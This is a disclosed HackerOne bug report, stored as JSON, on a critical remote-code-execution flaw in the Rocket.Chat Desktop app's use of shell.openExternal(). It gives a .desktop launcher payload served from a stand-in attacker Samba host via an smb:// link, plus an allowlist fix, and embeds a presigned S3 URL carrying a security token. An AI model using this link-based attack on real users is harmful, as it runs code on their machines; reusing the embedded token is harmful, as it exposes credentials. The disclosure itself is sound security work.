@@ -1,0 +1,140 @@
+{
+  "id": 924151,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MjQxNTE=",
+  "url": "https://hackerone.com/reports/924151",
+  "title": "Insecure use of shell.openExternal() in Rocket.Chat Desktop App leading to RCE",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-07-15T10:00:26.071Z",
+  "submitted_at": "2020-07-15T10:00:26.071Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "baltpeter",
+    "url": "/baltpeter",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/Z4xLc16fgbZUEZk5R3Spyi4t/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19858,
+    "url": "https://hackerone.com/rocket_chat",
+    "handle": "rocket_chat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rocket.Chat",
+      "twitter_handle": "RocketChat",
+      "website": "https://rocket.chat",
+      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-08-01T10:17:37.113Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-07-02T10:17:30.783Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** The Rocket.Chat Desktop app passes the links users click on to Electron's `shell.openExternal()` function which can lead to remote code execution.\n\n**Description:** The filtering on the URLs passed to `shell.openExternal()` is insufficient. An attacker can craft and send a link that when clicked will cause malicious code from a remote origin to be executed on the user's system. The specific attack presented here has been tested with Xubuntu 20.04, however similar attacks are also possible on other systems, including non-Linux operating systems.\n\n## Releases Affected:\n\n  * Tested with latest release 2.17.10 from https://github.com/RocketChat/Rocket.Chat.Electron/releases\n  * Tested with latest commit `4c06582` on the `develop` branch from https://github.com/RocketChat/Rocket.Chat.Electron\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n  1. Install Rocket.Chat Desktop on Xubuntu 20.04.\n  2. Login and join a channel.\n  3. Setup a public Samba server (at `attacker.tld` in this example) and create a public share (named `public` here). In this share, publish the following file as `pwn.desktop` and make it executable:\n     \n     ```ini\n    [Desktop Entry]\n    Exec=bash -c \"(mate-calc &); xmessage \\\"Hello from Electron.\\\"\"\n    Type=Application\n     ```\n  4. From another account in the same channel, send the following message with the corresponding values replaced: `smb://attacker.tld/public/pwn.desktop`\n  5. Click the link and (if necessary) confirm starting the untrusted launcher.\n  6. Notice the calculator and message box appearing, confirming remote code execution.\n\n## Supporting Material/References:\n\n  * I have attached a video of the attack to the report.\n\n## Suggested mitigation\n\n  * The problem is in the filter for local file paths in the preload scripts that sets up the link handler here: https://github.com/RocketChat/Rocket.Chat.Electron/blob/4c06582ba3021fcf10e6230286231d50e26e2723/src/preload/links.js#L24\n  * The filter only acts as a blocklist, filtering out `file://` links. There are however plenty of other protocols depending on the system, like `smb://` as shown here. Therefore, only an allowlist can successfully prevent attacks here. Usually, allowing `http://`, `https://` and `mailto:` will be enough but you may have different requirements.\n\nBest Regards,  \nBenjamin Altpeter  \nTechnical University of Braunschweig, Germany\n\n## Impact\n\n* The attack can be triggered remotely by an attacker by simply sending a message to a channel.\n  * The particular attack presented here requires user interaction. The user has to click the link (which is not obfuscated) and potentially confirm launching the executable. The last part may not be necessary depending on the particular attack vector and system the user runs.\n  * This particular presented attack only works on certain Linux distributions. However, this is only due to the particular attack payload used (a Linux `.desktop` file accessed over Samba). Similar payloads will also work on other Linux distributions as well as Windows and macOS. The Electron documentation explicitly warns against using `shell.openExternal()` with untrusted content: https://www.electronjs.org/docs/tutorial/security#14-do-not-use-openexternal-with-untrusted-content\n  * If the attack is executed successfully, the attacker can run arbitrary code on the user's system.\n  * Patching the problem is simple and doesn't break any legitimate use cases that I can think of.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 908132,
+      "file_name": "rocketchat.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/bDJmgZSNjMNKZJvnyzGr3F7z?response-content-disposition=attachment%3B%20filename%3D%22rocketchat.mp4%22%3B%20filename%2A%3DUTF-8%27%27rocketchat.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRTHIU2UX%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151024Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB4aCXVzLXdlc3QtMiJGMEQCIQClMIEpe0tv%2BQLEug6sEEXvQN2HXLj47w2DKsxsPISrBgIfCEHv8TSaeb3viTuR6LVfgWI%2Fbr40T1K%2FceJt6A5FaSq7BQjn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMLhp3YcJZwwPGu59mKo8FOwLdPN%2FUhlhrV43xrcyCbCLwVoFPFnvRaipbNGP9c1om5hL%2B4LeSSdBv9w7dSVnaFPmXwy6ZGqmJxQVKgzn1dW9wWoJO2DDQV4VUywgSQ%2BNfV0%2FRgp0tx1anfqFtPMeyFgWo%2BIO6eNUKR%2BkDI6Gu49wdzz5akkwltoMJmqjihqqcyi35kpEQdrKp2Wydt7FBGEbZoW%2FI%2F5seJimpX638Aj85n%2Fg9Wfx%2B470vLMMym%2FosvoitLKD7ckhN3v8m7UFhE4ZKQ1UIryjcdhVC8axsv0Xsbr3s7yywbrVXnLKJDSxgz9OQh2rvMSU4TYaI5JIy0qI%2B5OdpKT7Ta9jYlwoNYBDeoc6nGeu6lf8Q3Pdkl46qDEeQO8E9GOvNDW96j8NfC%2BnbfLEmIVsoL3LXTzgr3ZTpETIydOmZfMHV1hS3ui64UKHdauQazq9K3XWL57xEz2e9ukq9j3V8lRc3d%2FW11KD603o3g31q%2FMOjKxT5Dglvfiq%2FpnfTsN5vDzJImxE5iyCWcJU8oWRyDin3K%2BnHdDoUvt4rmQJllSTrr9m6yYWVfvxoc0wywgs%2FJJTZjilNZPKrHPIMkSwdoaVpj%2F0ou9Z9SzS6%2FuCxcjFfke7D%2BaRdJlgoUlDHyMLg61UL0Ez1bTXWDvQH9cp%2FxbODVqRWX4ZibjSIl%2FChkmQxIrWgfhv6mVX0ZFEohZghoB%2Bib1D1LuMsjhjuQ3RwWkT5iGhVbaeKjz2RSumj1iJB8wCq7uqDRNTn%2FCbBYa030LYerB%2B3KB5Q6CD4uVRY1VaFwXAFrLP2XZJHwfzYsE9KQYOrBBeFnT0hCuWwsMcUzkUYnov2HMnkGOoMOIG3Cmsjxn6sCvkWfb7tSRNQhZAnakUJozDQgP3PBjqyAcIk7X7CvLxBfxmeqFcrcynKPo0q%2FR0rwaBjvNy9hYXMhY9p%2FD0Ce6bp14fkCe4zQSKDuN8lmj4x%2FPFiEprLFfT%2FU3B3ISm%2F1SaFq%2Bu4jA7IfEPkNg5IQDqDxVcg7l2MGdC%2BoYkagsNCCk8zOGtonj0VlnSemGLfS%2BTvR%2FFQsyysHudYR02Q9gAy7Ji%2B77PicrW6J5bw9oEwLA1oMiA4pD%2FxsRgAsqgCZloaf0NYbX5qTc4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1a33f756c646112743258101acf981d2ed5b41a74a2fda5129573912818444f5",
+      "file_size": 598549,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-08-01T10:17:30.861Z",
+  "allow_singular_disclosure_after": -118990374.0682763,
+  "singular_disclosure_allowed": true,
+  "vote_count": 12,
+  "voters": [
+    "tikidude",
+    "kashsec",
+    "zy9ard3",
+    "yassinek3ch",
+    "sirwinxwims",
+    "polem4rch",
+    "renekroka",
+    "f_m",
+    "jn01",
+    "shivammusic",
+    "and 2 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
